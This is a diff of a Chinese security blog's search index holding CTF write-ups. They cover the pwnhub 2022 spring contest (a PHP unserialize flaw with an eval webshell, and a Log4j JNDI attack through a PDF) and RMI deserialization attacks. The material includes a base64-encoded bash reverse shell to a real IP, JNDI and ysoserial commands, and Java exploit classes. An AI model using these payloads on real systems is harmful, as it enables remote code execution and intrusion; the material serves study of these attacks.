+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="number">1.117</span>.<span class="number">144.41</span></span><br></pre></td></tr></table></figure>
+
+<p>pdf插入payload</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234433-p9c1ntp.png" alt="image.png"></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234415-7nlu79x.png" alt="image.png"></p>
+<h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><p>并发可以写入，比赛的时候写进去了，但是当时环境有问题，之后修复环境之后一血就没了</p>
+]]></content>
+      <categories>
+        <category>ctfStudy</category>
+      </categories>
+      <tags>
+        <tag>比赛复现</tag>
       </tags>
   </entry>
   <entry>
@@ -2354,141 +2412,6 @@ c	push self.find_class(modname, name);
       </tags>
   </entry>
   <entry>
-    <title>pwnhub2022春季赛</title>
-    <url>/2022/04/27/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
-    <content><![CDATA[<h1 id="pwnhub春季赛web"><a href="#pwnhub春季赛web" class="headerlink" title="pwnhub春季赛web"></a>pwnhub春季赛web</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>周末一堆事情，而且周日正常上课，搞得没有好好打。所以认真复现一下。</p>
-<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><blockquote>
-<ol>
-<li>mysql恶意服务端读取文件</li>
-<li>路径拼接导致的文件包含</li>
-</ol>
-</blockquote>
-<p>mysql恶意服务端读取任意文件</p>
-<p>然后路径大概是这样：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/www/html/route/route.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/baseTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/mysqlTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/base64Tool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/testTool.php</span><br></pre></td></tr></table></figure>
-
-
-<p>读取到testTool的时候就发现了hint</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testTool</span> <span class="keyword">extends</span> <span class="title">baseTool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>] = <span class="variable">$arg</span>[<span class="string">&#x27;Y0U_CA0_n3vEr_F1nD_m3_LOL&#x27;</span>] <span class="keyword">or</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">userToolInit</span>(<span class="keyword">__CLASS__</span>, <span class="string">&#x27;./index.php?s=tool/test&#x27;</span>, <span class="string">&#x27;testxe7xb1xbb&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/sandbox&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="variable">$value</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>];</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&#x27;/tmp/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$value</span>[<span class="string">&#x27;file&#x27;</span>]), <span class="variable">$value</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>他有一个反序列化字符串的地方，没有过滤或者限制</p>
-<p>因此直接就能phpinfo</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427231142-x05ny6k.png" alt="image.png"></p>
-<p>但是并没有什么用，不过我们可以知道remote_addr的值为218.94.97.29</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427223626-o2z27cp.png" alt="image.png"></p>
-<p>接下来尝试用下面的方法写shell进去，没有任何过滤</p>
-<p>但是写入的shell会在<code>/tmp/sandbox/027abbac7d8dc5486b5f33965cfce8c4/</code>目录下，没办法直接访问</p>
-<p>因为<code>$this-&gt;class</code>可控而且拼接，所以可以直接目录穿越包含刚刚写入的shell</p>
-<p>但是这里要注意他有个后缀<code>Tool.php</code>，因此写入的时候让文件名也是<code>xxxTool.php</code>即可</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232239-1j95apf.png" alt="image.png"></p>
-<p>写入：</p>
-<p>post</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Y0U_CA0_n3vEr_F1nD_m3_LOL[file]=asoulTool.php&amp;Y0U_CA0_n3vEr_F1nD_m3_LOL[data]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>包含：</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232053-xffndtq.png" alt="image.png"></p>
-<h1 id="EzPDFParser"><a href="#EzPDFParser" class="headerlink" title="EzPDFParser"></a>EzPDFParser</h1><blockquote>
-<p><a href="https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/">https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/</a></p>
-<p>漏洞复现类赛题</p>
-</blockquote>
-<p>通过题目war包可以看到log4j的依赖</p>
-<p>反弹shell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
-
-<p>vps开启监听</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="number">1.117</span>.<span class="number">144.41</span></span><br></pre></td></tr></table></figure>
-
-<p>pdf插入payload</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234433-p9c1ntp.png" alt="image.png"></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234415-7nlu79x.png" alt="image.png"></p>
-<h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><p>并发可以写入，比赛的时候写进去了，但是当时环境有问题，之后修复环境之后一血就没了</p>
-]]></content>
-      <categories>
-        <category>ctfStudy</category>
-      </categories>
-      <tags>
-        <tag>比赛复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RMI反序列化攻击1</title>
-    <url>/2022/05/03/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>互打</p>
-<h1 id="Client攻击Server"><a href="#Client攻击Server" class="headerlink" title="Client攻击Server"></a>Client攻击Server</h1><h2 id="恶意参数"><a href="#恶意参数" class="headerlink" title="恶意参数"></a>恶意参数</h2><blockquote>
-<p>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</p>
-</blockquote>
-<h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>调试节有提过，<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091703-okmgwij.png" alt="image.png"></p>
-<h3 id="Object参数"><a href="#Object参数" class="headerlink" title="Object参数"></a>Object参数</h3><p>Server上的远程对象的参数有Object类型，Client就可以传恶意序列化数据过去，Server接收的时候会反序列化。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091214-xlahr1v.png" alt="image.png"></p>
-<p>如果参数类型不为Object，也可以通过以下方法来绕过</p>
-<ul>
-<li><a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">通过网络代理，在流量层修改数据</a></li>
-<li>自定义 “java.rmi” 包的代码，自行实现</li>
-<li><a href="https://www.anquanke.com/post/id/200860">字节码修改</a></li>
-<li>使用 debugger</li>
-</ul>
-<h1 id="Server攻击Registry"><a href="#Server攻击Registry" class="headerlink" title="Server攻击Registry"></a>Server攻击Registry</h1><h2 id="攻击bind-amp-rebind方法"><a href="#攻击bind-amp-rebind方法" class="headerlink" title="攻击bind&amp;rebind方法"></a>攻击bind&amp;rebind方法</h2><p>漏洞触发点：<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502203727-qd2t7ui.png" alt="image.png"></p>
-<p>用<code>AnnotationInvocationHandler</code> 来代理 <code>Remote</code> 接口让其能够在bind方法里面被反序列化</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException, RemoteException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) CC6.getCC6();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用AnnotationInvocationHandler动态代理实现Remote接口</span></span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor AnnotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler o=(InvocationHandler)AnnotationInvocationHandlerConstructor.newInstance(Target.class,map);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, o));</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.bind(<span class="string">&quot;fuck&quot;</span>,r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502205044-k75uik6.png" alt="image.png"></p>
-<p>原因是<code>sun.rmi.registry.RegistryImpl#registryFilter</code>里的白名单</p>
-<p><a href="https://xz.aliyun.com/t/10170">JEP290</a>的限制，也就是下面这个补丁之后加入的白名单</p>
-<p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388</a></p>
-<blockquote>
-<p>第一次遇到，为之后再详细去看他铺垫</p>
-<p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，描述网址<a href="https://openjdk.java.net/jeps/290">点这里</a>。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p>
-<p>JEP 290 主要提供了几个机制：</p>
-<ul>
-<li>提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；</li>
-<li>限制反序列化的调用深度和复杂度；</li>
-<li>为 RMI export 的对象设置了验证机制；</li>
-<li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置。</li>
-</ul>
-</blockquote>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502225643-pivl6ga.png" alt="image.png"></p>
-<blockquote>
-<p>参考：<a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p>
-</blockquote>
-<h2 id="UnicastRef绕过JEP290"><a href="#UnicastRef绕过JEP290" class="headerlink" title="UnicastRef绕过JEP290"></a>UnicastRef绕过JEP290</h2><blockquote>
-<p>bypass这里可以单独整理</p>
-</blockquote>
-<p>用UnicastRef对象新建一个RMI连接绕过JEP290的限制，配合ysoserial中的<a href="https://xz.aliyun.com/t/2650">JRMPListener模块</a></p>
-<p><code>8u121&lt;=jdk&lt;=8u231</code></p>
-<ol>
-<li>用<code>ysoserial</code>启动一个恶意的<code>JRMPListener</code></li>
-<li>启动注册中心</li>
-<li>启动Client调用<code>bind()</code>操作</li>
-<li>注册中心被反序列化攻击</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>Client</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.IHello;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(IHello.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Server攻击Client"><a href="#Server攻击Client" class="headerlink" title="Server攻击Client"></a>Server攻击Client</h1><p>Server返回给Client远程方法调用结果的时候，会序列化传输</p>
-<p>服务端收到会反序列化触发漏洞</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.RMIServer;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadServer1</span> &#123;</span><br><span class="line">    <span class="comment">//Server攻击Client</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCalc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RCalc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">map</span> <span class="operator">=</span> CC6.getCC6();</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RCalc</span> <span class="variable">rCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RCalc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,rCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BadServer1</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Registry攻击Client"><a href="#Registry攻击Client" class="headerlink" title="Registry攻击Client"></a>Registry攻击Client</h1><p>可以用ysoserial搭建恶意Registry来打Client</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">3333</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>javaSec</category>
-      </categories>
-      <tags>
-        <tag>rmi</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>rmi代码分析</title>
     <url>/2022/05/02/rmi%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="简介前的简介"><a href="#简介前的简介" class="headerlink" title="简介前的简介"></a>简介前的简介</h1><p>额，一直以来貌似养成了不好的习惯，在写完这一篇之后发现，我为什么要写文章啊。。</p>
@@ -2717,6 +2640,83 @@ c	push self.find_class(modname, name);
       </categories>
       <tags>
         <tag>java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RMI反序列化攻击1</title>
+    <url>/2022/05/03/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>互打</p>
+<h1 id="Client攻击Server"><a href="#Client攻击Server" class="headerlink" title="Client攻击Server"></a>Client攻击Server</h1><h2 id="恶意参数"><a href="#恶意参数" class="headerlink" title="恶意参数"></a>恶意参数</h2><blockquote>
+<p>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</p>
+</blockquote>
+<h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>调试节有提过，<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091703-okmgwij.png" alt="image.png"></p>
+<h3 id="Object参数"><a href="#Object参数" class="headerlink" title="Object参数"></a>Object参数</h3><p>Server上的远程对象的参数有Object类型，Client就可以传恶意序列化数据过去，Server接收的时候会反序列化。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091214-xlahr1v.png" alt="image.png"></p>
+<p>如果参数类型不为Object，也可以通过以下方法来绕过</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">通过网络代理，在流量层修改数据</a></li>
+<li>自定义 “java.rmi” 包的代码，自行实现</li>
+<li><a href="https://www.anquanke.com/post/id/200860">字节码修改</a></li>
+<li>使用 debugger</li>
+</ul>
+<h1 id="Server攻击Registry"><a href="#Server攻击Registry" class="headerlink" title="Server攻击Registry"></a>Server攻击Registry</h1><h2 id="攻击bind-amp-rebind方法"><a href="#攻击bind-amp-rebind方法" class="headerlink" title="攻击bind&amp;rebind方法"></a>攻击bind&amp;rebind方法</h2><p>漏洞触发点：<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502203727-qd2t7ui.png" alt="image.png"></p>
+<p>用<code>AnnotationInvocationHandler</code> 来代理 <code>Remote</code> 接口让其能够在bind方法里面被反序列化</p>
